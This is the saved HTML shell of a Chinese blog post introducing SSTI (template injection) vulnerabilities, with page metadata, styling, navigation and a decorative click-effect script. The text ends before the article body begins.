<!DOCTYPE html>
<!-- saved from url=(0047)https://www.cnblogs.com/bmjoker/p/13508538.html -->
<html lang="zh-cn" style="--olcb-folder-code-block-max-height: 80vh; --cnb-code-bg: rgb(245, 245, 245); --cnb-code-font-size: 12px; --cnb-code-color: rgb(68, 68, 68);"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="referrer" content="origin-when-cross-origin">
    <meta name="description" content="好久没更新博客了，现在主要在作源码审计相关工作，在工作中也遇到了各种语言导致的一些SSTI，今天就来大概说一下SSTI模板注入这个老生常谈的漏洞 前言 模板引擎 模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，利用模板引擎来生成前">
    <meta property="og:description" content="好久没更新博客了，现在主要在作源码审计相关工作，在工作中也遇到了各种语言导致的一些SSTI，今天就来大概说一下SSTI模板注入这个老生常谈的漏洞 前言 模板引擎 模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，利用模板引擎来生成前">
    <meta http-equiv="Cache-Control" content="no-transform">
    <meta http-equiv="Cache-Control" content="no-siteapp">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>(◍´꒳`◍) Hi, bmjoker - 1. SSTI（模板注入）漏洞（入门篇）</title>
    <link id="favicon" rel="shortcut icon" href="https://files-cdn.cnblogs.com/files/bmjoker/530836.gif" type="image/svg+xml">
    
    <style>#home :not(.cnblogs_code):not(.cnblogs_Highlighter)>pre:not([highlighted]):not([class*="brush:"]) code:not(.hljs), :not(.cnblogs_code):not(.cnblogs_Highlighter)>pre:not([highlighted]):not([class*="brush:"]) code:not(.hljs) {background: rgb(245, 245, 245);
        padding: 12px;
        border: 0.8px solid rgb(204, 204, 204);
        border-radius: 3px;
        border-color: transparent;
        color: rgb(68, 68, 68);
        font-family: "Courier New", sans-serif;
        font-size: 12px</style><link rel="stylesheet" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/blog-common.min.css">
    

    
        <link id="highlighter-theme-cnblogs" type="text/css" rel="stylesheet" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/cnblogs.css">
    <link type="text/css" rel="stylesheet" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/custom.css">
    
    <link id="mobile-style" media="only screen and (max-width: 767px)" type="text/css" rel="stylesheet" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/bundle-simplememory-mobile-pure.min.css">
    
    <link type="application/rss+xml" rel="alternate" href="https://www.cnblogs.com/bmjoker/rss">
    <link type="application/rsd+xml" rel="EditURI" href="https://www.cnblogs.com/bmjoker/rsd.xml">
    <link type="application/wlwmanifest+xml" rel="wlwmanifest" href="https://www.cnblogs.com/bmjoker/wlwmanifest.xml">
    <script type="text/javascript" src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/encoder.js.下载"></script><script>
        var currentBlogId = 415571;
        var currentBlogApp = 'bmjoker';
        var isLogined = false;
        var isBlogOwner = false;
        var skinName = 'SimpleMemory';
        var visitorUserId = '';
        var hasCustomScript = true;
        try {
            if (hasCustomScript && document.referrer && document.referrer.indexOf('baidu.com') >= 0) {
                Object.defineProperty(document, 'referrer', { value: '' });
                Object.defineProperty(Document.prototype, 'referrer', { get: function () { return ''; } });
            }
        } catch (error) { }
        window.cb_enable_mathjax = true;
        window.mathEngine = 0;
        window.codeHighlightEngine = 1;
        window.enableCodeLineNumber = false;
        window.codeHighlightTheme = 'cnblogs';
        window.darkModeCodeHighlightTheme = 'vs2015';
        window.isDarkCodeHighlightTheme = false;
        window.isDarkModeCodeHighlightThemeDark = true;
        window.isDisableCodeHighlighter = false;
        window.enableCodeThemeTypeFollowSystem = false;
        window.enableMacStyleCodeBlock = false
    </script>
        <script>
            var currentPostDateAdded = '2020-09-14 09:36';
        </script>
    <script src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/jquery-2.2.0.min.js.下载"></script>
    <script src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/blog-common.min.js.下载"></script><style>.medium-zoom-overlay {
  position: fixed;
  top: 0;
  right: 0;
  bottom: 0;
  left: 0;
  opacity: 0;
  transition: opacity 300ms;
  will-change: opacity;
}

.medium-zoom--opened .medium-zoom-overlay {
  cursor: pointer;
  cursor: zoom-out;
  opacity: 1;
}

.medium-zoom-image {
  cursor: pointer;
  cursor: zoom-in;
  /*
    The `transition` is marked as "!important" for the animation to happen
    even though it's overriden by another inline `transition` style attribute.

    This is problematic with frameworks that generate inline styles on their
    images (e.g. Gatsby).

    See https://github.com/francoischalifour/medium-zoom/issues/110
   */
  transition: transform 300ms cubic-bezier(0.2, 0, 0.2, 1) !important;
}

.medium-zoom-image--hidden {
  visibility: hidden;
}

.medium-zoom-image--opened {
  position: relative;
  cursor: pointer;
  cursor: zoom-out;
  will-change: transform;
}
</style><script id="hljs-script" src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/highlight.min.js.下载" type="text/javascript" async=""></script>
    

    
<script id="mathjax" src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/MathJax.js.下载" type="text/javascript" defer=""></script><style data-id="immersive-translate-input-injected-css">.immersive-translate-input {
  position: absolute;
  top: 0;
  right: 0;
  left: 0;
  bottom: 0;
  z-index: 2147483647;
  display: flex;
  justify-content: center;
  align-items: center;
}

.immersive-translate-input-loading {
  --loading-color: #f78fb6;
  width: 6px;
  height: 6px;
  border-radius: 50%;
  display: block;
  margin: 12px auto;
  position: relative;
  color: white;
  left: -100px;
  box-sizing: border-box;
  animation: immersiveTranslateShadowRolling 1.5s linear infinite;
}

@keyframes immersiveTranslateShadowRolling {
  0% {
    box-shadow: 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
  }

  12% {
    box-shadow: 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
  }

  25% {
    box-shadow: 110px 0 var(--loading-color), 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
  }

  36% {
    box-shadow: 120px 0 var(--loading-color), 110px 0 var(--loading-color), 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0);
  }

  50% {
    box-shadow: 130px 0 var(--loading-color), 120px 0 var(--loading-color), 110px 0 var(--loading-color), 100px 0 var(--loading-color);
  }

  62% {
    box-shadow: 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color), 120px 0 var(--loading-color), 110px 0 var(--loading-color);
  }

  75% {
    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color), 120px 0 var(--loading-color);
  }

  87% {
    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color);
  }

  100% {
    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0);
  }
}
</style><script src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/jquery.mousewheel.min.js.下载"></script><style type="text/css">.MathJax_Hover_Frame {border-radius: .25em; -webkit-border-radius: .25em; -moz-border-radius: .25em; -khtml-border-radius: .25em; box-shadow: 0px 0px 15px #83A; -webkit-box-shadow: 0px 0px 15px #83A; -moz-box-shadow: 0px 0px 15px #83A; -khtml-box-shadow: 0px 0px 15px #83A; border: 1px solid #A6D ! important; display: inline-block; position: absolute}
.MathJax_Menu_Button .MathJax_Hover_Arrow {position: absolute; cursor: pointer; display: inline-block; border: 2px solid #AAA; border-radius: 4px; -webkit-border-radius: 4px; -moz-border-radius: 4px; -khtml-border-radius: 4px; font-family: 'Courier New',Courier; font-size: 9px; color: #F0F0F0}
.MathJax_Menu_Button .MathJax_Hover_Arrow span {display: block; background-color: #AAA; border: 1px solid; border-radius: 3px; line-height: 0; padding: 4px}
.MathJax_Hover_Arrow:hover {color: white!important; border: 2px solid #CCC!important}
.MathJax_Hover_Arrow:hover span {background-color: #CCC!important}
</style><style type="text/css">#MathJax_About {position: fixed; left: 50%; width: auto; text-align: center; border: 3px outset; padding: 1em 2em; background-color: #DDDDDD; color: black; cursor: default; font-family: message-box; font-size: 120%; font-style: normal; text-indent: 0; text-transform: none; line-height: normal; letter-spacing: normal; word-spacing: normal; word-wrap: normal; white-space: nowrap; float: none; z-index: 201; border-radius: 15px; -webkit-border-radius: 15px; -moz-border-radius: 15px; -khtml-border-radius: 15px; box-shadow: 0px 10px 20px #808080; -webkit-box-shadow: 0px 10px 20px #808080; -moz-box-shadow: 0px 10px 20px #808080; -khtml-box-shadow: 0px 10px 20px #808080; filter: progid:DXImageTransform.Microsoft.dropshadow(OffX=2, OffY=2, Color='gray', Positive='true')}
#MathJax_About.MathJax_MousePost {outline: none}
.MathJax_Menu {position: absolute; background-color: white; color: black; width: auto; padding: 2px; border: 1px solid #CCCCCC; margin: 0; cursor: default; font: menu; text-align: left; text-indent: 0; text-transform: none; line-height: normal; letter-spacing: normal; word-spacing: normal; word-wrap: normal; white-space: nowrap; float: none; z-index: 201; box-shadow: 0px 10px 20px #808080; -webkit-box-shadow: 0px 10px 20px #808080; -moz-box-shadow: 0px 10px 20px #808080; -khtml-box-shadow: 0px 10px 20px #808080; filter: progid:DXImageTransform.Microsoft.dropshadow(OffX=2, OffY=2, Color='gray', Positive='true')}
.MathJax_MenuItem {padding: 2px 2em; background: transparent}
.MathJax_MenuArrow {position: absolute; right: .5em; padding-top: .25em; color: #666666; font-size: .75em}
.MathJax_MenuActive .MathJax_MenuArrow {color: white}
.MathJax_MenuArrow.RTL {left: .5em; right: auto}
.MathJax_MenuCheck {position: absolute; left: .7em}
.MathJax_MenuCheck.RTL {right: .7em; left: auto}
.MathJax_MenuRadioCheck {position: absolute; left: 1em}
.MathJax_MenuRadioCheck.RTL {right: 1em; left: auto}
.MathJax_MenuLabel {padding: 2px 2em 4px 1.33em; font-style: italic}
.MathJax_MenuRule {border-top: 1px solid #CCCCCC; margin: 4px 1px 0px}
.MathJax_MenuDisabled {color: GrayText}
.MathJax_MenuActive {background-color: Highlight; color: HighlightText}
.MathJax_MenuDisabled:focus, .MathJax_MenuLabel:focus {background-color: #E8E8E8}
.MathJax_ContextMenu:focus {outline: none}
.MathJax_ContextMenu .MathJax_MenuItem:focus {outline: none}
#MathJax_AboutClose {top: .2em; right: .2em}
.MathJax_Menu .MathJax_MenuClose {top: -10px; left: -10px}
.MathJax_MenuClose {position: absolute; cursor: pointer; display: inline-block; border: 2px solid #AAA; border-radius: 18px; -webkit-border-radius: 18px; -moz-border-radius: 18px; -khtml-border-radius: 18px; font-family: 'Courier New',Courier; font-size: 24px; color: #F0F0F0}
.MathJax_MenuClose span {display: block; background-color: #AAA; border: 1.5px solid; border-radius: 18px; -webkit-border-radius: 18px; -moz-border-radius: 18px; -khtml-border-radius: 18px; line-height: 0; padding: 8px 0 6px}
.MathJax_MenuClose:hover {color: white!important; border: 2px solid #CCC!important}
.MathJax_MenuClose:hover span {background-color: #CCC!important}
.MathJax_MenuClose:hover:focus {outline: none}
</style><style type="text/css">.MathJax_Preview .MJXf-math {color: inherit!important}
</style><style type="text/css">.MJX_Assistive_MathML {position: absolute!important; top: 0; left: 0; clip: rect(1px, 1px, 1px, 1px); padding: 1px 0 0 0!important; border: 0!important; height: 1px!important; width: 1px!important; overflow: hidden!important; display: block!important; -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none}
.MJX_Assistive_MathML.MJX_Assistive_MathML_Block {width: 100%!important}
</style><style type="text/css">#MathJax_Zoom {position: absolute; background-color: #F0F0F0; overflow: auto; display: block; z-index: 301; padding: .5em; border: 1px solid black; margin: 0; font-weight: normal; font-style: normal; text-align: left; text-indent: 0; text-transform: none; line-height: normal; letter-spacing: normal; word-spacing: normal; word-wrap: normal; white-space: nowrap; float: none; -webkit-box-sizing: content-box; -moz-box-sizing: content-box; box-sizing: content-box; box-shadow: 5px 5px 15px #AAAAAA; -webkit-box-shadow: 5px 5px 15px #AAAAAA; -moz-box-shadow: 5px 5px 15px #AAAAAA; -khtml-box-shadow: 5px 5px 15px #AAAAAA; filter: progid:DXImageTransform.Microsoft.dropshadow(OffX=2, OffY=2, Color='gray', Positive='true')}
#MathJax_ZoomOverlay {position: absolute; left: 0; top: 0; z-index: 300; display: inline-block; width: 100%; height: 100%; border: 0; padding: 0; margin: 0; background-color: white; opacity: 0; filter: alpha(opacity=0)}
#MathJax_ZoomFrame {position: relative; display: inline-block; height: 0; width: 0}
#MathJax_ZoomEventTrap {position: absolute; left: 0; top: 0; z-index: 302; display: inline-block; border: 0; padding: 0; margin: 0; background-color: white; opacity: 0; filter: alpha(opacity=0)}
</style><style type="text/css">.MathJax_Preview {color: #888}
#MathJax_Message {position: fixed; left: 1em; bottom: 1.5em; background-color: #E6E6E6; border: 1px solid #959595; margin: 0px; padding: 2px 8px; z-index: 102; color: black; font-size: 80%; width: auto; white-space: nowrap}
#MathJax_MSIE_Frame {position: absolute; top: 0; left: 0; width: 0px; z-index: 101; border: 0px; margin: 0px; padding: 0px}
.MathJax_Error {color: #CC0000; font-style: italic}
</style><style type="text/css">.MJXp-script {font-size: .8em}
.MJXp-right {-webkit-transform-origin: right; -moz-transform-origin: right; -ms-transform-origin: right; -o-transform-origin: right; transform-origin: right}
.MJXp-bold {font-weight: bold}
.MJXp-italic {font-style: italic}
.MJXp-scr {font-family: MathJax_Script,'Times New Roman',Times,STIXGeneral,serif}
.MJXp-frak {font-family: MathJax_Fraktur,'Times New Roman',Times,STIXGeneral,serif}
.MJXp-sf {font-family: MathJax_SansSerif,'Times New Roman',Times,STIXGeneral,serif}
.MJXp-cal {font-family: MathJax_Caligraphic,'Times New Roman',Times,STIXGeneral,serif}
.MJXp-mono {font-family: MathJax_Typewriter,'Times New Roman',Times,STIXGeneral,serif}
.MJXp-largeop {font-size: 150%}
.MJXp-largeop.MJXp-int {vertical-align: -.2em}
.MJXp-math {display: inline-block; line-height: 1.2; text-indent: 0; font-family: 'Times New Roman',Times,STIXGeneral,serif; white-space: nowrap; border-collapse: collapse}
.MJXp-display {display: block; text-align: center; margin: 1em 0}
.MJXp-math span {display: inline-block}
.MJXp-box {display: block!important; text-align: center}
.MJXp-box:after {content: " "}
.MJXp-rule {display: block!important; margin-top: .1em}
.MJXp-char {display: block!important}
.MJXp-mo {margin: 0 .15em}
.MJXp-mfrac {margin: 0 .125em; vertical-align: .25em}
.MJXp-denom {display: inline-table!important; width: 100%}
.MJXp-denom > * {display: table-row!important}
.MJXp-surd {vertical-align: top}
.MJXp-surd > * {display: block!important}
.MJXp-script-box > *  {display: table!important; height: 50%}
.MJXp-script-box > * > * {display: table-cell!important; vertical-align: top}
.MJXp-script-box > *:last-child > * {vertical-align: bottom}
.MJXp-script-box > * > * > * {display: block!important}
.MJXp-mphantom {visibility: hidden}
.MJXp-munderover, .MJXp-munder {display: inline-table!important}
.MJXp-over {display: inline-block!important; text-align: center}
.MJXp-over > * {display: block!important}
.MJXp-munderover > *, .MJXp-munder > * {display: table-row!important}
.MJXp-mtable {vertical-align: .25em; margin: 0 .125em}
.MJXp-mtable > * {display: inline-table!important; vertical-align: middle}
.MJXp-mtr {display: table-row!important}
.MJXp-mtd {display: table-cell!important; text-align: center; padding: .5em 0 0 .5em}
.MJXp-mtr > .MJXp-mtd:first-child {padding-left: 0}
.MJXp-mtr:first-child > .MJXp-mtd {padding-top: 0}
.MJXp-mlabeledtr {display: table-row!important}
.MJXp-mlabeledtr > .MJXp-mtd:first-child {padding-left: 0}
.MJXp-mlabeledtr:first-child > .MJXp-mtd {padding-top: 0}
.MJXp-merror {background-color: #FFFF88; color: #CC0000; border: 1px solid #CC0000; padding: 1px 3px; font-style: normal; font-size: 90%}
.MJXp-scale0 {-webkit-transform: scaleX(.0); -moz-transform: scaleX(.0); -ms-transform: scaleX(.0); -o-transform: scaleX(.0); transform: scaleX(.0)}
.MJXp-scale1 {-webkit-transform: scaleX(.1); -moz-transform: scaleX(.1); -ms-transform: scaleX(.1); -o-transform: scaleX(.1); transform: scaleX(.1)}
.MJXp-scale2 {-webkit-transform: scaleX(.2); -moz-transform: scaleX(.2); -ms-transform: scaleX(.2); -o-transform: scaleX(.2); transform: scaleX(.2)}
.MJXp-scale3 {-webkit-transform: scaleX(.3); -moz-transform: scaleX(.3); -ms-transform: scaleX(.3); -o-transform: scaleX(.3); transform: scaleX(.3)}
.MJXp-scale4 {-webkit-transform: scaleX(.4); -moz-transform: scaleX(.4); -ms-transform: scaleX(.4); -o-transform: scaleX(.4); transform: scaleX(.4)}
.MJXp-scale5 {-webkit-transform: scaleX(.5); -moz-transform: scaleX(.5); -ms-transform: scaleX(.5); -o-transform: scaleX(.5); transform: scaleX(.5)}
.MJXp-scale6 {-webkit-transform: scaleX(.6); -moz-transform: scaleX(.6); -ms-transform: scaleX(.6); -o-transform: scaleX(.6); transform: scaleX(.6)}
.MJXp-scale7 {-webkit-transform: scaleX(.7); -moz-transform: scaleX(.7); -ms-transform: scaleX(.7); -o-transform: scaleX(.7); transform: scaleX(.7)}
.MJXp-scale8 {-webkit-transform: scaleX(.8); -moz-transform: scaleX(.8); -ms-transform: scaleX(.8); -o-transform: scaleX(.8); transform: scaleX(.8)}
.MJXp-scale9 {-webkit-transform: scaleX(.9); -moz-transform: scaleX(.9); -ms-transform: scaleX(.9); -o-transform: scaleX(.9); transform: scaleX(.9)}
.MathJax_PHTML .noError {vertical-align: ; font-size: 90%; text-align: left; color: black; padding: 1px 3px; border: 1px solid}
</style><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="snapSvg" src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/snap.svg-min.js.下载"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="tools" src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/tools.min.js.下载"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="src/script/lib/css.min" src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/css.min.js.下载"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="classie" src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/classie.min.js.下载"></script><link type="text/css" rel="stylesheet" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/optiscroll.min.css"><link type="text/css" rel="stylesheet" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/menu_bubble.min.css"><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="optiscroll_ToProgress_rotate" src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/optiscroll_ToProgress_rotate.min.js.下载"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="main4" src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/main4.min.js.下载"></script><link type="text/css" rel="stylesheet" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/font_543384_kv876ayucyc.css"><link type="text/css" rel="stylesheet" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/google-fonts.min.css"><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="base" src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/base.min.js.下载"></script><link href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/a11y-dark.min.css" rel="stylesheet" type="text/css"><link href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/jquery.mCustomScrollbar.min.css" rel="stylesheet" type="text/css"><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="highlightjs" src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/highlight.min.js(1).下载"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="clipboard" src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/clipboard.min.js.下载"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="articleStatement" src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/articleStatement.min.js.下载"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="RibbonsEffect" src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/RibbonsEffect.min.js.下载"></script><link type="text/css" rel="stylesheet" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/jquery.fancybox.min.css"><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="title" src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/articleTitle.min.js.下载"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="bootstrap" src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/bootstrap.min.js.下载"></script><link type="text/css" rel="stylesheet" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/marvin.nav2.min.css"><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="fancybox" src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/jquery.fancybox.min.js.下载"></script></head>
<body class="skin-simplememory no-navbar mathjax2" style="overflow: auto;"><div id="dayNightSwitch" class="generalWrapper">    <div class="onOff daySwitch">        <div class="star star1"></div>        <div class="star star2"></div>        <div class="star star3"></div>        <div class="star star4"></div>        <div class="star star5"></div>        <div class="star sky"></div>        <div class="sunMoon">            <div class="crater crater1"></div>            <div class="crater crater2"></div>            <div class="crater crater3"></div>            <div class="cloud part1"></div>            <div class="cloud part2"></div>        </div>    </div></div><div id="MathJax_Message" style="display: none;"></div>
    <a name="top" style="display: none;"></a>
    <div id="top_nav" class="navbar forpc navbar-custom">
        <nav id="nav_main" class="navbar-main">
            <ul id="nav_left" class="navbar-list navbar-left">
                <li class="navbar-branding">
                    <a href="https://www.cnblogs.com/" title="开发者的网上家园" role="banner">
                        <img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/logo.svg" alt="博客园Logo">
                    </a>
                </li>
                <li>
                    <a href="https://www.cnblogs.com/" onclick="countClicks(&#39;skin-navbar-sitehome&#39;)">首页</a>
                </li>
                <li>
                    <a href="https://news.cnblogs.com/" onclick="countClicks(&#39;nav&#39;, &#39;skin-navbar-news&#39;)">新闻</a>
                </li>
                <li>
                    <a href="https://q.cnblogs.com/" onclick="countClicks(&#39;nav&#39;, &#39;skin-navbar-q&#39;)">博问</a>
                </li>
                    <li><a href="https://www.cnblogs.com/cmt/p/17489281.html">直播</a></li>
                <li>
                    <a href="https://ing.cnblogs.com/" onclick="countClicks(&#39;nav&#39;, &#39;skin-navbar-ing&#39;)">闪存</a>
                </li>
                <li>
                    <a href="https://edu.cnblogs.com/" onclick="countClicks(&#39;nav&#39;, &#39;skin-navbar-edu&#39;)">班级</a>
                </li>
            </ul>
            <ul id="nav_right" class="navbar-list navbar-right">
                <li>
                    <form id="zzk_search" class="navbar-search dropdown" action="https://zzk.cnblogs.com/s" method="get" role="search">
                        <input name="w" id="zzk_search_input" placeholder="代码改变世界" type="search" tabindex="3" autocomplete="off">
                        <button id="zzk_search_button" onclick="window.navbarSearchManager.triggerActiveOption()">
                            <img id="search_icon" class="focus-hidden" src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/search.svg" alt="搜索">
                            <img class="hidden focus-visible" src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/enter.svg" alt="搜索">
                        </button>
                        <ul id="navbar_search_options" class="dropdown-menu quick-search-menu">
                            <li tabindex="0" class="active" onclick="zzkSearch(event, document.getElementById(&#39;zzk_search_input&#39;).value)">
                                <div class="keyword-wrapper">
                                    <img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/search.svg" alt="搜索">
                                    <div class="keyword"></div>
                                </div>
                                <span class="search-area">所有博客</span>
                            </li>
                                    <li tabindex="1" onclick="zzkBlogSearch(event, &#39;bmjoker&#39;, document.getElementById(&#39;zzk_search_input&#39;).value)">
                                        <div class="keyword-wrapper">
                                            <img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/search.svg" alt="搜索">
                                            <div class="keyword"></div>
                                        </div>
                                        <span class="search-area">当前博客</span>
                                    </li>
                        </ul>
                    </form>
                </li>
                <li id="navbar_login_status" class="navbar-list">
                    <a class="navbar-user-info navbar-blog" href="https://i.cnblogs.com/EditPosts.aspx?opt=1" alt="写随笔" title="写随笔" style="display: none;">
                        <img id="new_post_icon" class="navbar-icon" src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/newpost.svg" alt="写随笔">
                    </a>
                    <a id="navblog-myblog-icon" class="navbar-user-info navbar-blog" href="https://passport.cnblogs.com/GetBlogApplyStatus.aspx" alt="我的博客" title="我的博客" style="display: none;">
                        <img id="myblog_icon" class="navbar-icon" src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/myblog.svg" alt="我的博客">
                    </a>
                    <a class="navbar-user-info navbar-message navbar-icon-wrapper" href="https://msg.cnblogs.com/" alt="短消息" title="短消息" style="display: none;">
                        <img id="msg_icon" class="navbar-icon" src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/message.svg" alt="短消息">
                        <span id="msg_count" style="display: none"></span>
                    </a>
                    <a id="navbar_lite_mode_indicator" data-current-page="blog" style="display: none" href="javascript:void(0)" alt="简洁模式" title="简洁模式启用，您在访问他人博客时会使用简洁款皮肤展示">
                        <img class="navbar-icon" src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/lite-mode-on.svg" alt="简洁模式">
                    </a>
                    <div id="user_info" class="navbar-user-info dropdown" style="display: none;">
                        <a class="dropdown-button" href="https://home.cnblogs.com/">
                            <img id="user_icon" class="navbar-avatar" src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/avatar-default.svg" alt="用户头像">
                        </a>
                        <div class="dropdown-menu">
                            <a id="navblog-myblog-text" href="https://passport.cnblogs.com/GetBlogApplyStatus.aspx">我的博客</a>
                            <a href="https://home.cnblogs.com/">我的园子</a>
                            <a href="https://account.cnblogs.com/settings/account">账号设置</a>
                            <a href="javascript:void(0)" id="navbar_lite_mode_toggle" title="简洁模式会使用简洁款皮肤显示所有博客">
    简洁模式 <img id="navbar_lite_mode_on" src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/lite-mode-check.svg" class="hide" style="display: none;"><span id="navbar_lite_mode_spinner" class="hide">...</span>
</a>
                            <a href="javascript:void(0)" onclick="account.logout();">退出登录</a>
                        </div>
                    </div>
                    <a class="navbar-anonymous" href="https://account.cnblogs.com/signup" style="display: inline;">注册</a>
                    <a class="navbar-anonymous" href="javascript:void(0);" onclick="account.login()" style="display: inline;">登录</a>
                </li>
            </ul>
        </nav>
    </div>

    <div id="page_begin_html">
        复制代码<script type="text/javascript">
var a_idx = 0;
jQuery(document).ready(function($) {
    $("body").click(function(e) {
        var a = new Array("❤","❤","❤","❤","❤","❤","❤","❤","❤","❤","❤","❤");
        var $i = $("<span></span>").text(a[a_idx]);
        a_idx = (a_idx + 1) % a.length;
        var x = e.pageX,
        y = e.pageY;
        $i.css({
            "z-index": 999999999999999999999999999999999999999999999999999999999999999999999,
            "top": y - 20,
            "left": x,
            "position": "absolute",
            "font-weight": "bold",
            "color": "rgb("+~~(255*Math.random())+","+~~(255*Math.random())+","+~~(255*Math.random())+")"
        });
        $("body").append($i);
        $i.animate({
            "top": y - 180,
            "opacity": 0
        },
        1500,
        function() {
            $i.remove();
        });
    });
});
</script>
    </div>

    <!--done-->
<div id="home" style="margin-top: 40vh;">
<div id="header">
	<div id="blogTitle">
        <a id="lnkBlogLogo" href="https://www.cnblogs.com/bmjoker/"><img id="blogLogo" src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/logo.gif" alt="返回主页"></a>		
		
<!--done-->
<h1><a id="Header1_HeaderTitle" class="headermaintitle HeaderMainTitle" href="https://www.cnblogs.com/bmjoker/">bmjoker's blog</a>
</h1>
<h2></h2>




		
	</div><!--end: blogTitle 博客的标题和副标题 -->
	<div id="navigator">
		
<ul id="navList">
<li>
</li>
<li>

</li>
<li>


</li>
<li>
</li>
<li>

<!--<partial name="./Shared/_XmlLink.cshtml" model="Model" /></li>--></li>
<li>
<a id="blog_nav_admin" class="menu" href="https://i.cnblogs.com/">
管理</a>
</li>
</ul>


		<div class="blogStats">
			<span id="stats_post_count">随笔 - 197&nbsp; </span>
<span id="stats_article_count">文章 - 0&nbsp; </span>
<span id="stats-comment_count">评论 - 86&nbsp; </span>
<span id="stats-total-view-count">阅读 - 
<span title="总阅读数: 737537">
73万</span></span>

		</div><!--end: blogStats -->
	</div><!--end: navigator 博客导航栏 -->
</div><!--end: header 头部 -->
<div id="main">
	<div id="mainContent">
	<div class="forFlow">
